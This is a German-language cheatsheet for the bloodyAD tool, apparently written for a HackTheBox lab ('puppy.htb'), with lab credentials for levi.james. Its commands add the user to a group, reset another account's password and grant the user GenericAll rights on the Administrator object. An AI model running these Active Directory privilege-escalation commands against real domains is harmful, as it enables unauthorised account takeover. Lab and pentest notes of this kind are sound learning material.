
## 🩸 BloodyAD Cheatsheet

<br>

🧩 **Retrieve User Information**

Fragt Active Directory-Objekt (z. B. einen Benutzer) ab und zeigt alle LDAP-Attribute des Zielobjekts.
```bash
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get object administrator
```
<br>

🧩 **Add User To Group**

Zeigt die Zugriffsrechte (ACLs) auf das Gruppenobjekt $group_name im Active Directory. 
Anhand der Rechte kann dann die Mitgliedschaft hinzugefügt werden, sofern GenericAll, WriteProperty, WriteDACL etc. vorhanden sind.
```
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get writeable 
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
```

<br>

🧩 **Change Password**

Fragt mit bloodyAD die Zugriffssteuerungsliste (ACL) eines Active Directory-Objekts und anschließend wird das Passwort vom Zielobjekt geändert, sofern Berechtigungen vorhanden sind.
```
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get writeable 
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' set password $target_username $new_password
```

<br>

🧩 **Give User GenericAll Rights**

Versucht, dem Benutzer Levi.James die GenericAll-Berechtigung auf das AD-Objekt mit dem Distinguished Name Administrator zu geben.
"Füge der Access Control List (ACL) des Administrator-Objekts hinzu, dass levi.james volle Rechte bekommt.“
```
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add genericAll "CN=Administrator,CN=Users,DC=puppy,DC=htb" levi.james
```
